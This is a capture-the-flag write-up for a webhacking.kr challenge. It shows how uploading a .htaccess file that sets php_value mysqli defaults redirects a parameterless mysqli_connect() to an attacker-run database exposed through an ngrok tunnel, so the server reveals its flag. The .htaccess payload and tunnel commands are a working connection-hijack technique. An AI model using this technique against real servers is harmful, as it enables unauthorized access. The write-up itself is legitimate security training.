# Old 30    MySQL Connection Hijack

URL: [http://webhacking.kr:10003](http://webhacking.kr:10003)

![old-30.png](/assets/ctf/webhacking.kr/old-30.png)

```php
<?php
if ($_GET["view_source"]) {
    highlight_file(__FILE__);
}

($db = mysqli_connect()) or die();

mysqli_select_db($db, "chall30") or die();

($result = mysqli_fetch_array(mysqli_query($db, "select flag from chall30_answer"))) or die();

if ($result[0]) {
    include "/flag";
}
?>
```

This challenge doesn't contain `include "../../config.php";` like other PHP files and performs `mysqli_connect` without any parameters.

[https://www.php.net/manual/en/mysqli.construct.php](https://www.php.net/manual/en/mysqli.construct.php)

```php
mysqli_connect(
    ?string $hostname = null,
    ?string $username = null,
    #[\SensitiveParameter] ?string $password = null,
    ?string $database = null,
    ?int $port = null,
    ?string $socket = null
): mysqli|false
```

![old-30-1.png](/assets/ctf/webhacking.kr/old-30-1.png)

[Runtime Configuration](https://www.php.net/manual/en/mysqli.configuration.php#mysqli.configuration)

![old-30-2.png](/assets/ctf/webhacking.kr/old-30-2.png)

Prepare database:
```bash
└─# cat create.sql
DROP DATABASE IF EXISTS chall30;
CREATE DATABASE chall30;
USE chall30;
CREATE TABLE chall30_answer(
    id INT AUTO_INCREMENT PRIMARY KEY,
    flag VARCHAR(255) NOT NULL
);
INSERT INTO chall30_answer (flag) VALUES ('FLAG{letmein}');
DROP USER IF EXISTS 'chall30'@'%';
CREATE USER 'chall30'@'%' IDENTIFIED BY 'Password123$';
GRANT SELECT ON chall30.chall30_answer TO 'chall30'@'%';
FLUSH PRIVILEGES;

└─# mariadb -u root < create.sql
```

_Did you know that you can set php.ini values right inside the .htaccess file? It's actually very easy_ [src](https://davidwalsh.name/php-values-htaccess)
```ini
# Format
php_value setting_name setting_value

# Example
php_value  upload_max_filesize  10M
```

Start a tunnel for your database, like ngrok or some other service
```bash
└─$ ngrok tcp 3306
```

Create `.htaccess`
```php
php_value mysqli.default_host "0.tcp.eu.ngrok.io"
php_value mysqli.default_port "12985"
php_value mysqli.default_user "chall30"
php_value mysqli.default_pw "Password123$"
```

Upload and visit your directory, flag should get included.

```bash
FLAG{uhoh-db-connection-hijacking?}
```